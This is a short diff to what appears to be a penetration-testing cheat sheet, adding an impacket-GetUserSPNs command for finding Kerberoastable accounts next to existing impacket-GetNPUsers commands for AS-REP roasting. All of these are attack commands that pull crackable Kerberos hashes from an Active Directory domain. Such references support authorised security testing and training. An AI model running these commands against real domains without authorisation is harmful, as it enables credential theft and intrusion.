@@ -6,3 +6,8 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast -users
 
 # Scan for if a user is ASREP/AS-REP-roastable in a target domain
 impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast '<domain>/<username>' 
+
+% windows, impacket, getuserspns, kerberoast, kerberoastable
+
+# Scan for Kerberoastable users in a target domain
+impacket-GetUserSPNs -dc-ip <dc_ip> '<domain>/<user>:<password>'
